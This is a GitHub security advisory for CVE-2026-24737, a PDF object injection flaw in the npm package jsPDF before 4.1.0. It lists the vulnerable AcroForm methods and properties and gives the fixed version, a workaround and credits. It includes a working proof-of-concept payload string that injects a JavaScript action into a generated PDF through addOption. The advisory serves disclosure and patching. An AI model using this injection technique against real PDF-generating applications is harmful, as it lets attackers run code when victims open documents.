# [H] jsPDF has PDF Injection in AcroFormChoiceField that allows Arbitrary JavaScript Execution

## Summary
Severity: High
Advisory: GHSA-pqxr-3g65-p328
CVE: CVE-2026-24737
CWE: CWE-116
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-pqxr-3g65-p328
Type: github-advisory

## Affected
- npm: `jspdf` — affected >=0 <4.1.0

## Details
### Impact

User control of properties and methods of the Acroform module allows users to inject arbitrary PDF objects, such as JavaScript actions.

If given the possibility to pass unsanitized input to one of the following methods or properties, a user can inject arbitrary PDF objects, such as JavaScript actions, which are executed when the victim opens the document. The vulnerable API members are:

* `AcroformChoiceField.addOption`
* `AcroformChoiceField.setOptions`
* `AcroFormCheckBox.appearanceState`
* `AcroFormRadioButton.appearanceState`

Example attack vector:

```js
import { jsPDF } from "jspdf"
const doc = new jsPDF();

var choiceField = new doc.AcroFormChoiceField();
choiceField.T = "VulnerableField";
choiceField.x = 20;
choiceField.y = 20;
choiceField.width = 100;
choiceField.height = 20;

// PAYLOAD:
// 1. Starts with "/" to bypass escaping.
// 2. "dummy]" closes the array.
// 3. "/AA" injects an Additional Action (Focus event).
// 4. "/JS" executes arbitrary JavaScript.
const payload = "/dummy] /AA << /Fo << /S /JavaScript /JS (app.alert('XSS')) >> >> /Garbage [";

choiceField.addOption(payload);
doc.addField(choiceField);

doc.save("test.pdf");
```

### Patches

The vulnerability has been fixed in jsPDF@4.1.0.

### Workarounds
Sanitize user input before passing it to the vulnerable API members.

### Credits
Research and fix: Ahmet Artuç

## References
- https://github.com/parallax/jsPDF/security/advisories/GHSA-pqxr-3g65-p328
- https://nvd.nist.gov/vuln/detail/CVE-2026-24737
- https://github.com/parallax/jsPDF/commit/da291a5f01b96282545c9391996702cdb8879f79
- https://github.com/parallax/jsPDF
- https://github.com/parallax/jsPDF/releases/tag/v4.1.0
